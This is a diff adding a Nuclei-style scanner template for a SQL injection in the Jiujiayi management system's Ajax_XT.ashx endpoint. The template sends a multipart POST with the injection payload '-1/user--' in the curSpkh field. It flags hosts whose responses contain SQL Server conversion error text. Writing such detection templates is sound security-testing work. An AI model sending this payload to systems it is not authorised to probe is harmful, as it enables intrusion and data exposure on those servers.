@@ -1,0 +1,38 @@
+id: jiujiayi-Ajax_XT-sql
+
+info:
+  name: 九佳易管理系统 Ajax_XT.ashx 存在SQL注入漏洞
+  author: jiujiayi
+  severity: high
+  tags: jiujiayi
+
+http:
+  - raw:
+      - |
+        POST /Service/Ajax_XT.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="curFlag"
+        
+        PicSord
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="curPxbh"
+        
+        1,2
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="curSpkh"
+        
+        '-1/user--
+        ------WebKitFormBoundary--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nvarchar'
+          - '转换成数据类型'
+        condition: and
